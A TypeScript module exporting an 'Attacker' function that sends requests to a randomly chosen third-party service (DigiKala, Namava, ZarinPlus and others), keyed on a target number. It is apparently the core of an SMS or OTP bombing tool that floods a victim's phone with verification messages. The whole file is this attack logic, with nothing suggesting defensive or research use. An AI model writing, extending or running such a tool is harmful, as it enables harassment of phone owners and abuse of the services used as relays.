import axios, { AxiosRequestConfig } from "axios";
import { API as APIs } from "./api";

export const Attacker = async (num: number, Loop: string) => {
  return new Promise(async (resolve, reject) => {
    const API = APIs(num)[Math.floor(Math.random() * APIs(num).length)];

    const config: AxiosRequestConfig = {
      method: API.method,
      url: API.url,
      headers: API.headers,
      data: API.data,
    };
    try {
      const { data, status } = await axios(config);
      if (API.name === "DigiKala" && data.status === 400) {
        reject(`Request From ${API.name} Failed \n${data.message}`);
      } else if (API.name === "Namava" && !data.succeeded) {
        reject(`Request From ${API.name} Failed \n${data.error.message}`);
      } else if (API.name === "ZarinPlus" && !data.status) {
        reject(`Request From ${API.name} Failed \n${data.message}`);
      } else if (API.name === "KasbinoApp" && !data.result) {
        reject(`Request From ${API.name} Failed \n${data.status}`);
      } else if (API.name === "Civapp" && !data) {
        reject(`Request From ${API.name} Failed \n${data}`);
      } else if (API.name === "CodeYab" && !data.isSuccess) {
        reject(
          `Request From ${API.name} Failed \n${data.metaData.appStatusCode}`
        );
      } else if (status === 200) {
        resolve(`Request From ${API.name} Sends To ${num}`);
      }
    } catch (error) {
      reject(`${API.name} : \n${error?.response?.statusText}`);
    }
  });
};
